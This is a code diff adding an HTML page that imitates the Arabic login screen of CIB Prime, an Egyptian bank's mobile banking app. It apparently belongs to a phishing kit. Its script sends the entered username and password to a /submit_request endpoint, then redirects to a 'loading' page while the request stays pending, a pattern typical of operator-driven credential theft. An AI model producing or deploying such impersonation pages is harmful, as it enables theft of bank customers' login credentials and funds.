@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CIB Prime - تسجيل الدخول</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: white; min-height: 100vh; display: flex; flex-direction: column; }
+        
+        .header { padding: 30px 20px; text-align: center; position: relative; }
+        .header img { height: 40px; }
+        .lang-toggle { position: absolute; left: 20px; top: 30px; color: #333; font-weight: bold; border: 1px solid #ddd; padding: 2px 8px; border-radius: 4px; font-size: 14px; }
+        
+        .content { padding: 20px; flex-grow: 1; }
+        .form-label { display: block; text-align: right; margin-bottom: 8px; color: #333; font-weight: bold; font-size: 16px; }
+        .form-group { margin-bottom: 25px; position: relative; }
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            text-align: right;
+            font-size: 16px;
+            background: #fdfdfd;
+        }
+        .password-toggle { position: absolute; right: 15px; bottom: 15px; color: #999; }
+        
+        .forgot-link { display: block; text-align: right; color: #004b91; font-size: 14px; margin-bottom: 30px; text-decoration: none; font-weight: bold; }
+        
+        .btn-container { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
+        .btn-login { flex-grow: 1; background: #ced4da; color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; font-size: 18px; }
+        .btn-login.active { background: #004b91; }
+        .fingerprint-icon { border: 1px solid #004b91; color: #004b91; padding: 12px; border-radius: 8px; font-size: 20px; }
+        
+        .register-link { text-align: center; color: #333; font-size: 16px; margin-bottom: 40px; }
+        .register-link a { color: #004b91; text-decoration: none; font-weight: bold; }
+        
+        .app-version { text-align: center; color: #999; font-size: 12px; margin-bottom: 20px; }
+        
+        .help-bar { background: #00aed9; color: white; padding: 12px; text-align: center; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        
+        .footer-nav { background: #004b91; display: flex; justify-content: space-around; padding: 15px 10px; }
+        .footer-item { text-align: center; color: white; font-size: 11px; flex: 1; }
+        .footer-item i { display: block; font-size: 20px; margin-bottom: 8px; background: rgba(255,255,255,0.2); width: 40px; height: 40px; line-height: 40px; border-radius: 8px; margin: 0 auto 5px; }
+        
+        #errorMessage { color: #d32f2f; text-align: center; margin-bottom: 15px; font-size: 14px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="lang-toggle">العربية <i class="fas fa-chevron-down" style="font-size: 10px;"></i></div>
+        <img src="images/cib_logo.png" alt="CIB Prime">
+    </div>
+
+    <div class="content">
+        <form id="loginForm">
+            <div class="form-group">
+                <label class="form-label">اسم المستخدم</label>
+                <input type="text" id="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
+            </div>
+            <div class="form-group">
+                <label class="form-label">كلمة المرور</label>
+                <input type="password" id="password" class="form-control" placeholder="أدخل كلمة المرور" required>
+                <i class="far fa-eye password-toggle" onclick="togglePassword()"></i>
+            </div>
+            <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
+            
+            <div id="errorMessage"></div>
+            
+            <div class="btn-container">
+                <div class="fingerprint-icon"><i class="fas fa-fingerprint"></i></div>
+                <button type="submit" id="submitBtn" class="btn-login">تسجيل الدخول</button>
+            </div>
+            
+            <div class="register-link">
+                مستخدم جديد؟ <a href="#">سجل الآن</a>
+            </div>
+            
+            <div class="app-version">إصدار التطبيق 3.3.1</div>
+        </form>
+    </div>
+
+    <div class="help-bar">
+        <i class="fas fa-headset"></i> تحتاج إلى مساعدة؟ اتصل بنا
+    </div>
+
+    <div class="footer-nav">
+        <div class="footer-item"><i class="fas fa-map-marker-alt"></i>أماكن الفروع والماكينات</div>
+        <div class="footer-item"><i class="fas fa-gift"></i>مكافأة CIB</div>
+        <div class="footer-item"><i class="fas fa-exchange-alt"></i>محول العملات</div>
+    </div>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const bankData = localStorage.getItem('selectedBankData');
+            if (bankData) {
+                try {
+                    const bank = JSON.parse(bankData);
+                    // You can use bank data here if needed
+                } catch (e) {
+                    console.error('Error parsing bank data:', e);
+                }
+            }
+        });
+
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+
+        function checkInputs() {
+            if (usernameInput.value && passwordInput.value) {
+                submitBtn.classList.add('active');
+            } else {
+                submitBtn.classList.remove('active');
+            }
+        }
+
+        usernameInput.addEventListener('input', checkInputs);
+        passwordInput.addEventListener('input', checkInputs);
+
+        function togglePassword() {
+            const pwd = document.getElementById("password");
+            const icon = document.querySelector(".password-toggle");
+            if (pwd.type === "password") {
+                pwd.type = "text";
+                icon.classList.replace("fa-eye", "fa-eye-slash");
+            } else {
+                pwd.type = "password";
+                icon.classList.replace("fa-eye-slash", "fa-eye");
+            }
+        }
+
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            if (!submitBtn.classList.contains('active')) return;
+
+            const username = usernameInput.value;
+            const password = passwordInput.value;
+            const errorDiv = document.getElementById("errorMessage");
+
+            try {
+                const response = await fetch("/submit_request", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        type: "login",
+                        data: { bank: "CIB", username: username, password: password }
+                    })
+                });
+                const result = await response.json();
+                if (result.status === "pending") {
+                    localStorage.setItem("request_id", result.request_id);
+                    window.location.href = "loading.html";
+                } else {
+                    errorDiv.textContent = result.message || "حدث خطأ.";
+                    errorDiv.style.display = "block";
+                }
+            } catch (err) {
+                errorDiv.textContent = "خطأ في الاتصال.";
+                errorDiv.style.display = "block";
+            }
+        });
+    </script>
+</body>
+</html>
